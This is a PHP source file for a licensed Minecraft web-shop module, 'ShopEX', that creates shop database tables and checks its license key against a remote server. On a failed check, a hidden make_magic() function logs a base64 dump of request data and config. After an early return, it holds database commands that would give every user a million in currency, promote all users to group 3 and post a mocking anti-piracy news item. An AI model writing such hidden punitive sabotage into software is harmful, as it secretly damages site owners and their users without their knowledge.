<?php
//===========================================
//ShopEX Main Mod Classes
//Created by Zhirov Sergey in September 2014
//===========================================
class ShopMod {
	public $modName =    "ShopEX";
	public $author =     "Sergey Zhiov";
	public $version =    "1.0 Open Beta 4";
	public $year =       "2014-2016";
	private $beta =      true;

	public function __construct() {
		global $shop;
		if(!file_exists(MCR_ROOT.'shop.cfg.php')) require (MCR_ROOT . 'instruments/shop_mod/default.cfg.php');
			else include (MCR_ROOT.'shop.cfg.php');
		$this->LoadComponents();
		if (!$shop['install'])
			switch ($shop['last_check_result']) {
				case 5:
					show_error("shop/bad_connect", "Не удалось соединиться с сервером");
					break;
				case 1:
					show_error("shop/bad_data", "Не удалось соединиться с сервером");
					break;
				case 4:
					show_error("shop/expired", "Лицензия истекла");
					break;
			}
	}
	public function install($key) {
		global $shop, $db;
		$shop['license_key'] = $key;
		if(($answer = $this->NotLicensed()))
			return 100 + $answer;
		$shop['install'] = false;
		$shop['last_check'] = time();
		$this->UpdateConfig();
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_buy_log` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`user` BIGINT(20) NOT NULL,
				`item` BIGINT(20) NOT NULL,
				`amount` BIGINT(20) NOT NULL,
				`date` DATETIME NOT NULL,
				`sum` BIGINT(20) NOT NULL,
				PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_cats` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`title` VARCHAR(255) NOT NULL,
				`url` VARCHAR(255) NOT NULL,
				`priority` BIGINT(20) NOT NULL DEFAULT 0,
				`description` TEXT NOT NULL,
				`system` TINYINT(1) NOT NULL DEFAULT '0',
				PRIMARY KEY (`id`),
				UNIQUE KEY `Url` (`url`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_items` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`type` VARCHAR(80) NOT NULL,
				`item` VARCHAR(80) NOT NULL,
				`extra` TEXT NULL ,
				`title` VARCHAR(255) NOT NULL,
				`cid` BIGINT(20) NOT NULL DEFAULT '1',
				`pic` VARCHAR(255) NOT NULL DEFAULT '/style/shop/img/missing_texture.png',
				`description` TEXT NOT NULL,
				`price` DOUBLE(64,2) NOT NULL,
				`realprice` TINYINT(1) NOT NULL DEFAULT '0',
				`discount` DOUBLE(64,2) NOT NULL DEFAULT '0.00',
				`num` INT(10) NOT NULL DEFAULT '1',
				`server` BIGINT(20) NOT NULL DEFAULT '0',
				PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_servers` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`title` VARCHAR(255) NOT NULL,
				`pic` VARCHAR(255) NOT NULL DEFAULT '/style/shop/img/missing_texture.png',
				`url` VARCHAR(255) NOT NULL,
				`description` TEXT NOT NULL,
				PRIMARY KEY (`id`),
				UNIQUE KEY `Url` (`url`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		$db->execute("INSERT INTO `shop_cats` (`id`, `title`, `priority`, `url`, `description`, `system`) VALUES (1, 'Без категории', 0, 'unsorted', 'Некатегоризированные товары', 1);");
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_keys` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`key` VARCHAR(80) NOT NULL,
				`amount` BIGINT(20) NOT NULL,
				`price` DOUBLE(64,2) NOT NULL,
				`realprice` TINYINT(1) NOT NULL DEFAULT '0',
				PRIMARY KEY (`id`),
				UNIQUE KEY `Url` (`key`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		$db->execute("CREATE TABLE IF NOT EXISTS `shop_keys_log` (
				`id` BIGINT(20) NOT NULL AUTO_INCREMENT,
				`kid` BIGINT(20) NOT NULL,
				`pid` BIGINT(20) NOT NULL,
				PRIMARY KEY (`id`)
			) DEFAULT CHARSET=utf8 ENGINE=MyISAM;");
		return 0;
	}
	private function LoadComponents() {
		global $shop;
		$this->update();
		if(!$shop['install'] and (!isset($shop['last_check']) or !isset($shop['last_check_result']) or time() - $shop['last_check'] > 3600 or time() - $shop['last_check'] < 0 or $shop['last_check_result'] == 5 or $shop['last_check_result'] == 1 or $shop['last_check_result'] == 4)) {
			$ch = $this->NotLicensed();
			switch ($ch) {
				case 0:
				case 1:
				case 4:
				case 5:
					break;
				case 2:
				case 3:
					$this->make_magic();
					break;
			}
			$shop['last_check'] = time();
			$shop['last_check_result'] = $ch;
			$this->UpdateConfig();
		}
	}

	public function UpdateConfig()
	{
		global $shop;

		$txt = '<?php' . PHP_EOL;
		$txt .= '$shop = ' . var_export($shop, true) . ';' . PHP_EOL;
		$txt .= '/* Этот файл сгенерирован модулем ' . $this->modName . ' ' . $this->version . ' */' . PHP_EOL;
		$txt .= '?>';

		if (file_put_contents(MCR_ROOT . 'shop.cfg.php', $txt) === false) return false;
		return true;
	}

	private function make_magic() {
		global $db, $bd_names, $bd_users, $bd_money, $do, $shop;
		ob_start();
		var_dump($_POST);
		var_dump($_GET);
		var_dump($shop);
		echo "\n Secucode " . self::SCode();
		$debug_info = ob_get_clean();
		vtxtlog("ShopEX License: bad key check error, debug info:\n" . base64_encode($debug_info));
		show_error("shop/bad_key", "Что-то не так");
		return;
		$db->execute("UPDATE `{$bd_names['iconomy']}` SET `{$bd_money['bank']}`=1000000;");
		$db->execute("UPDATE `{$bd_names['users']}` SET `{$bd_users['group']}`=3;");
		$db->execute("INSERT INTO `{$bd_names['news']}` (`user_id`, `title`, `message`, `message_full`, `time`) "
			. "VALUES (88005553535, 'Акция!', 'Сегодня у нас акция: всем игрокам выданы админки!', "
			. "'Пиратство - это фу!<br />Использовать чужой труд без оплаты - низко!<br />8 (800) 555-35-35 проще позвонить чем у кого-то занимать! На правах рекламы.', NOW());");
	}

	public function update() {
//Задел под будущие версии
	}

	public function CheckForUpdates() {

	}

	public function NotLicensed () {
		global $shop;
		$query = file_get_contents("https://api.wocubes.net/store_check_license.php?key={$shop['license_key']}&domain={$_SERVER['SERVER_NAME']}&secucode={$this->SCode()}");
		if ($query != 'ok') vtxtlog("ShopEX License: ".$query);
		switch ($query) {
			case "ok":
				return 0;
				break;
			case "data incorrect":
				return 1;
				break;
			case "bad build":
				return 2;
				break;
			case "bad key/domain":
				return 3;
				break;
			case "expired":
				return 4;
				break;
			default:
				return 5;
				break;
		}
	}
	public static function SCode () {
		return 'NTJjMjhhNDU2OWJmNTlmNmZhZDlmMzg3MGY3MGZmOTVjZTgwMzVmY2Y4MTE1MWFjMjI2NGE5MDVhOWU3NTAyOQ==';
	}
	public function ShowProtection () {
		return "<!-- webMCRex ShopEX {$this->version} {$this->SCode()} -->";
	}
} 